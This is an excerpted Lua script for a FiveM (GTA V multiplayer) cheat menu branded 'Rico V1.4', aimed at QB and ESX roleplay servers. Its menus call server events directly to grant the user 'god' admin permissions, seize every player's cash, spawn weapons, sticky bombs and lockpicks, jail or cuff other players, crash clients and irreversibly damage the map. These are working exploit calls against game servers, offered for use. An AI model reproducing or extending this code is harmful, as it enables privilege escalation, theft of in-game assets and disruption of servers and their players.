...
menuKeybind2 = "F11"	
noclipKeybind = "L"		
teleportKeyblind = "F12"
fixvaiculoKeyblind = "N"
startMessage = "~b~¦~s~WELCOME ~b~[ ~s~1.4 ~b~]~n~👤 LOGIN → ~b~[~s~ " ..GetPlayerName(PlayerId()).. " ~b~] ~w~∑"	
subMessage = "~n~~w~🔒 OPEN MENU "
subMessage1 = "🔑 ~g~[ ~s~"..menuKeybind.." ~g~]~s~ OR ~g~[ ~s~"..menuKeybind2.."~g~ ]"
motd2 = "~b~Discord: ~s~#Rico_Official"
motd = "~h~Support: ~y~QB + ESX "
motd5 = "HAVE A GOOD GAME 😈" 
...
function MIOddhwuie.SetTheme(id, theme)
    ...
    elseif theme == "infamous" then
        ...
        MIOddhwuie.SetTitleBackgroundColor(id, 61, 248, 249)
        MIOddhwuie.SetTitleColor(id, 240, 240, 240, 255)
        MIOddhwuie.SetMenuSubTextColor(id, 240, 240, 240, 255)
        MIOddhwuie.SetMenuFocusBackgroundColor(id, 61, 248, 249)
...
Citizen.CreateThread(function()
    ...
    while true do
        if theme == "skid" then -- static effect for skid theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
            ...
            for i = 1, #menulist do MIOddhwuie.SetTitleBackgroundSprite(menulist[i], 'Mpweaponsunusedfornow', 'w_me_fist') end
        end
        Wait(100)
    end
end)
...
Citizen.CreateThread(function()
    ...
    MIOddhwuie.SetSubTitle('skid', '~s~Rico V1.4')
    ...
    MIOddhwuie.CreateSubMenu('weather', 'world', 'Weather Changer ~b~(CLIENT SIDE)')
    ...
    MIOddhwuie.CreateSubMenu('vrp', 'lua', 'QB Spawm Items')
    ...
    while true do
        ...
        if MIOddhwuie.IsMenuOpened('skid') then
            ...
            elseif MIOddhwuie.MenuButton('~o~Self Options', 'self') then  
			...
			elseif MIOddhwuie.MenuButton('~r~Fuck Server', 'fuckserver') then
            elseif MIOddhwuie.MenuButton('~b~Lua Options', 'lua') then
            elseif MIOddhwuie.Button('~y~Exit Menu') then break
            end
            ShowInfo(motd2)
	        ShowInfo(motd)
	        ShowInfo(motd5)
		...
		elseif MIOddhwuie.IsMenuOpened('fuckserver') then
			...
			elseif MIOddhwuie.Button("~y~[Most QB] ~s~Mugshot ~y~All Server ~p~[VIP]") then
            TriggerServerEvent('qb-mugshot:server:triggerSuspect', -1)
			elseif MIOddhwuie.CheckBox("~y~💀 RIP ~s~All Players ~y~FPS ~p~[VIP] 💀", WorldOnFire , Enable_Nuke) then
                WorldOnFire = not WorldOnFire
				Enable_Nuke = not Enable_Nuke
                if WorldOnFire then
				ShowInfo("~r~🔥Destroyer🔥...")
                    wofDUI = CreateDui("https://www.youtube.com/watch?v=X5s_BOOopYQ", 1, 1)
                else
                    DestroyDui(wofDUI)
                end
	...
	elseif MIOddhwuie.Button("~y~Spawn ~p~Lion ~s~all Players") then
	 ...
	 elseif MIOddhwuie.Button('~o~Make all Players ~s~hamburger head') then
            ...
            elseif MIOddhwuie.Button("~y~Fuck Up The Map (Irreversible!)  ~p~[VIP]") then
                if not FuckMap then
        ...
        elseif MIOddhwuie.Button('Crash FiveM ~r~GLOCK 3') then
           ...
           elseif MIOddhwuie.Button('Crash FiveM ~r~MK2 4') then
			 ...
			 if MIOddhwuie.Button('~y~[ESX] ~w~Send To Jail ~p~[VIP] ~r~(RISK)') then
			...
			elseif MIOddhwuie.Button('~y~[ESX] ~w~Cuff Player ~p~[VIP] ~r~(RISK)') then
			...
			elseif MIOddhwuie.Button('~r~Spawn ~g~Money Player') then
        ...
        elseif MIOddhwuie.IsMenuOpened('playeroptions') then
			...
			elseif MIOddhwuie.Button("~y~Copy ~s~Skin Player ~g~(SAFE)") then
         ...
         ShowInfo("~g~Skin Copied!")				
			...
			elseif MIOddhwuie.Button('~b~QB ~s~Revive') then
                    TriggerEvent("hospital:client:Revive")
        ...
        elseif MIOddhwuie.IsMenuOpened('self') then
            ...
            elseif MIOddhwuie.CheckBox("Demigod Mode", Demigod) then
                Demigod = not Demigod
			elseif MIOddhwuie.Button("~y~Pick Up ~w~Props ~y~[Y] ~p~[VIP]") then
    ...
    while true do
        ...
        if hit == 1 then
            ...
            if entityType == 3 or entityType == 2 then
                ...
                local entityInfo = "Entity Type: " .. entityText .. ", Entity: " .. entityHit .. ", Model: " .. entityModel
                local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
        ...
        if IsControlJustReleased(0, 246) then  -- Y key
            if validTarget then
                ...
                if holdingEntity and holdingCarEntity then
                    ...
                    ApplyForceToEntity(heldEntity, 1, direction.x * 20, direction.y * 20, direction.z * 20, 0.0, 0.0, 0.0, 0, false, true, true, false, true) -- 20 is the current throw force, change the 3 20s to your preference
...
-- i came back to code the car picking function before releasing it but still didnt fix shit to make code better lmao
                elseif MIOddhwuie.Button("~y~[QB] ~s~Give Pistol ~y~[INVENTORY]") then
                ...
                TriggerServerEvent('QBCore:Server:AddItem',"pistol_ExtendedClip",1)
                			elseif MIOddhwuie.Button("~y~[QB] ~s~Steal Everyones ~y~Money") then
                for i = 255, 1, -1 do
    TriggerServerEvent("police:server:SeizeCash", i)
end
            elseif MIOddhwuie.Button("~y~[QB-Admin] ~s~Admin Access ~p~[VIP] ~r~(RISK)") then
            local group = {rank = "god", label = "God"}

                local target = GetPlayerServerId(PlayerId(38))



                TriggerServerEvent('qb-admin:server:setPermissions', target, group)
			elseif MIOddhwuie.Button("~g~Self ~s~Revive") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			 if string.lower(confirm) == "y" then
		    ...
		    elseif MIOddhwuie.ComboBox("~b~Player ~s~Functions ~y~»", {"~b~QB ~s~Revive", "~b~Give ~s~Player Armor", "~y~Remove ~s~Player Armor", "~g~Clean Player", "~y~Suicide 💀", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
...
if MIOddhwuie.Button("~g~Reset Model To FiveM Player") then
	...
	elseif MIOddhwuie.Button("Change To ~o~Paramedic") then
			...
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~o~Rich Old Man") then
			...
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~r~Body Builder 01 M") then
			local model = "A_M_Y_MusclBeac_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~g~Body Builder 02 M") then
			local model = "A_M_Y_MusclBeac_02"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~p~Body Builder F") then
			local model = "CS_MaryAnn"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~o~Model Mexican") then
			local model = "CS_MaryAnn"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~r~Model Chinese") then
			local model = "G_M_M_ChiGoon_02"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~g~Model Black OPS") then
			local model = "S_M_Y_BlackOps_03"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif MIOddhwuie.Button("Change To ~p~Model Gang Boss") then
        ...
        elseif MIOddhwuie.IsMenuOpened('misc') then
			...
			elseif MIOddhwuie.ComboBox("~b~»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    ...
                    then
            elseif MIOddhwuie.ComboBox("~b~»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
        ...
        elseif MIOddhwuie.IsMenuOpened('lua') then
				...
				if MIOddhwuie.MenuButton('~g~ESX ~s~& ~b~RP ~s~💰 Money Options', 'money') then
                ...
                elseif MIOddhwuie.MenuButton('~y~QB ~s~Spawn ~p~Items', 'vrp') then
			end
			...
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
			elseif MIOddhwuie.Button("~s~Recruit~b~ Inem") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
			end
        ...
        elseif MIOddhwuie.IsMenuOpened('vrp') then
            if MIOddhwuie.Button("~y~[QB] ~w~Spawn ~p~SMG ~w~+ ~w~Ammo ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"weapon_smg",1)
                TriggerServerEvent('QBCore:Server:AddItem',"smg_ammo",100)
            elseif MIOddhwuie.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~Sticky Bomb ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"weapon_stickybomb",5)
                elseif MIOddhwuie.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~Lockpick + Advanced ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"lockpick",5)
                TriggerServerEvent('QBCore:Server:AddItem',"advancedlockpick",5)
                elseif MIOddhwuie.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~All Security Card ~y~[INVENTORY]") then
                ...
                elseif MIOddhwuie.Button("~w~SOON MORE") then
            end
